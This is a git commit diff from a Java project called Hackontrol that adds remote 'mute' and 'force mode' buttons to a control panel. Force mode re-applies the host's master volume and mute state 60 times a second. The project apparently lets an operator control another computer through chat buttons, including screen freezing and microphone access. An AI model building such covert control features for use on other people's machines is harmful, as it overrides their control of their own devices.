d06114b385c3f06b8c19786d1cff7b6029600e0a
KHOPAN <puthipnakchan@gmail.com>
2024-06-20 22:16:23 +0700

    Implement mute and force mode

--- src/com/khopan/hackontrol/panel/ControlPanel.java
+++ src/com/khopan/hackontrol/panel/ControlPanel.java
@@ -1,5 +1,8 @@
 package com.khopan.hackontrol.panel;
 
+import java.util.concurrent.Executors;
+import java.util.concurrent.TimeUnit;
+
 import com.khopan.hackontrol.handler.KeyboardHandler;
 import com.khopan.hackontrol.manager.interaction.ButtonContext;
 import com.khopan.hackontrol.manager.interaction.ButtonManager;
@@ -7,6 +10,7 @@ import com.khopan.hackontrol.manager.interaction.ButtonManager.ButtonType;
 import com.khopan.hackontrol.manager.interaction.Question;
 import com.khopan.hackontrol.manager.interaction.Question.QuestionType;
 import com.khopan.hackontrol.nativelibrary.Kernel;
+import com.khopan.hackontrol.nativelibrary.User;
 import com.khopan.hackontrol.registry.Registration;
 import com.khopan.hackontrol.utils.HackontrolMessage;
 import com.khopan.hackontrol.utils.Microphone;
@@ -38,6 +42,10 @@ public class ControlPanel extends Panel {
 
 	private final Microphone microphone;
 
+	private volatile float volume;
+	private volatile boolean mute;
+	private volatile boolean forceMode;
+
 	public ControlPanel() {
 		this.microphone = new Microphone();
 	}
@@ -56,10 +64,10 @@ public class ControlPanel extends Panel {
 		this.register(Registration.BUTTON, ControlPanel.BUTTON_VOLUME,                context -> {});
 		this.register(Registration.BUTTON, ControlPanel.BUTTON_MICROPHONE_CONNECT,    this.microphone :: connect);
 		this.register(Registration.BUTTON, ControlPanel.BUTTON_MICROPHONE_DISCONNECT, this.microphone :: disconnect);
-		this.register(Registration.BUTTON, ControlPanel.BUTTON_MUTE,                  context -> {});
-		this.register(Registration.BUTTON, ControlPanel.BUTTON_UNMUTE,                context -> {});
-		this.register(Registration.BUTTON, ControlPanel.BUTTON_FORCE,                 context -> {});
-		this.register(Registration.BUTTON, ControlPanel.BUTTON_UNFORCE,               context -> {});
+		this.register(Registration.BUTTON, ControlPanel.BUTTON_MUTE,                  context -> this.buttonMute(context, true));
+		this.register(Registration.BUTTON, ControlPanel.BUTTON_UNMUTE,                context -> this.buttonMute(context, false));
+		this.register(Registration.BUTTON, ControlPanel.BUTTON_FORCE,                 context -> this.buttonForceMode(context, true));
+		this.register(Registration.BUTTON, ControlPanel.BUTTON_UNFORCE,               context -> this.buttonForceMode(context, false));
 		this.register(Registration.BUTTON, ControlPanel.BUTTON_SCREEN_FREEZE,         context -> this.buttonFreeze(context, true));
 		this.register(Registration.BUTTON, ControlPanel.BUTTON_SCREEN_UNFREEZE,       context -> this.buttonFreeze(context, false));
 	}
@@ -83,6 +91,67 @@ public class ControlPanel extends Panel {
 				.actionRow(ControlPanel.BUTTON_SCREEN_FREEZE, ControlPanel.BUTTON_SCREEN_UNFREEZE)
 				.build()
 		};
+	}
+
+	@Override
+	public void initialize() {
+		Executors.newSingleThreadScheduledExecutor().scheduleAtFixedRate(() -> {
+			if(!this.forceMode) {
+				return;
+			}
+
+			if(User.getMasterVolume() != this.volume) {
+				User.setMasterVolume(this.volume);
+			}
+
+			if(User.isMute() != this.mute) {
+				User.setMute(this.mute);
+			}
+		}, 0, 1000 / 60, TimeUnit.MILLISECONDS);
+	}
+
+	private void buttonMute(ButtonContext context, boolean mute) {
+		if((this.forceMode ? this.mute : User.isMute()) == mute) {
+			HackontrolMessage.boldDeletable(context.reply(), "Master volume is already " + (mute ? "muted" : "unmuted"));
+			return;
+		}
+
+		if(!mute) {
+			Question.positive(context.reply(), "Are you sure you want to unmute?", QuestionType.YES_NO, () -> {
+				if(this.forceMode) {
+					this.mute = false;
+				} else {
+					User.setMute(false);
+				}
+			});
+
+			return;
+		}
+
+		if(this.forceMode) {
+			this.mute = true;
+		} else {
+			User.setMute(true);
+		}
+
+		context.deferEdit().queue();
+	}
+
+	private void buttonForceMode(ButtonContext context, boolean enable) {
+		if(this.forceMode == enable) {
+			HackontrolMessage.boldDeletable(context.reply(), "Force mode is already " + (enable ? "enabled" : "disabled"));
+			return;
+		}
+
+		if(!enable) {
+			Question.positive(context.reply(), "Are you sure you want to disable force mode?", QuestionType.YES_NO, () -> this.forceMode = false);
+			return;
+		}
+
+		this.volume = User.getMasterVolume();
+		this.mute = User.isMute();
+		this.forceMode = true;
+		context.deferEdit().queue();
 	}
 
 	private void buttonFreeze(ButtonContext context, boolean freeze) {
